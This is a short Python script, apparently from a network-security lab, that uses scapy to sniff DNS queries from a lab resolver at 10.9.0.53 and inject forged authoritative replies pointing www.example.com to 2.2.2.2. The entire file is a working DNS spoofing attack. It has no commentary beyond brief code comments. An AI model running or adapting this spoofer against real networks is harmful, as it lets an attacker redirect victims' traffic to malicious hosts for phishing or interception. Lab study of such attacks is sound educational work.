#!/usr/bin/env python3
from scapy.all import *

def spoof_lns(packet):
  if (DNS in packet and 'www.example.com' in packet[DNS].qd.qname.decode('utf-8')):
    packet.show()

    # swapping the IP addresses at the source and destination
    ip_packet = IP(dst=packet[IP].src, src=packet[IP].dst)

     # swapping the port number at the source and destination
    udp_packet = UDP(dport=packet[UDP].sport, sport=53)

    # updating res data
    res_section = DNSRR(rrname=packet[DNS].qd.qname, type='A',
                 ttl=259200, rdata='2.2.2.2')
                 
    # creating DNS packet
    dns_packet = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0,
                 an=res_section)

    # create IP packet and send the same
    spoofed_packet = ip_packet/udp_packet/dns_packet
    send(spoofed_packet)

# Sniff UDP packets and invoke spoof_lns().
f = 'udp and src host 10.9.0.53 and dst port 53'
packet = sniff(iface='br-0695fb34c3a8', filter=f, prn=spoof_lns)      

